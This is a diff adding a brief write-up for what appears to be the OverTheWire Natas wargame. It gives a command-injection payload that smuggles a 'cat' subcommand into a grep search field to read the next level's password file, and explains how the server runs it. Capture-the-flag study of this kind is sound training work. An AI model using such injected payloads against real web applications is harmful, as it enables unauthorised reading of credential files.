@@ -1,0 +1,13 @@
+$(cat /etc/natas_webpass/natas10) /etc/natas_webpass/natas10;
+
+
+copy the above line and paste in the input field. 
+
+How it works
+=======================
+- what if we pass the search string as the natas10 password and the search file as the natas10 password file.
+- For doing that i have given a sub command of "cat /etc/natas_webpass/natas10" this will cat the password
+and next is the password file itself. 
+- Semicolon at end is to terminate the command and leave any character after it.
+- the command that the server will see is "grep -i $(cat /etc/natas_webpass/natas10) /etc/natas_webpass/natas10; dictionary.txt"
+
